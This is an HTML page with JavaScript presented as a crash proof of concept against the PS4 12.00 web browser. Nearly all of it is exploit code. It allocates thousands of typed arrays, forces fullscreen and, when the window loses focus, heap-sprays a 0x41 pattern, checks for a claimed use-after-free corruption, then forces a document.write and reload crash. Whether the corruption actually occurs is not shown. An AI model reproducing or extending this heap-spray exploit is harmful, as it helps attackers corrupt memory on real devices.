<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 FullScreen Crash</title>
</head>
<body>

    <h1>PS4 12.00 - Crash</h1>
    
    <button onclick="runCrashTest1()">Run Crash</button>
    <div id="result1"></div>

    <script>
    const PATTERN = 2.121995791e-314; // 0x4141414141414141

    // VARIAÇÃO 1: EXATAMENTE IGUAL AO SEU ARQUIVO
    function runCrashTest1() {
        const result = document.getElementById('result1');
        result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
        
        let controllers = [];
        // Step 1: Create objects (Identical to original)
        for(let i = 0; i < 5000; i++) {
            let arr = new Float64Array(8);
            arr[0] = i;
            controllers.push(arr);
        }
        
        // Step 2: Fullscreen (Identical to original)
        const elem = document.documentElement;
        if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        
        // Step 3: Trigger on Options (Blur)
        window.onblur = function() {
            result.innerHTML += '<p>UAF triggered</p>';
            
            // Step 4: Spray (Identical: 8000 iterations)
            let spray = [];
            for(let i = 0; i < 8000; i++) {
                let p = new Float64Array(10);
                p.fill(PATTERN);
                spray.push(p);
            }
            
            // Step 5: Verification (Identical to original)
            let corrupted = null;
            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    break;
                }
            }
            
            if (corrupted) {
                result.innerHTML += '<p>Corruption confirmed</p>';
                // Step 6: The document.write sequence that causes the CE-36329-3
                setTimeout(() => {
                    document.open();
                    document.write('<html><body><h1>Crash</h1></body></html>');
                    document.close();
                    setTimeout(() => location.reload(), 500);
                }, 3000);
            }
        };
    }

    </script>

</body>
</html>
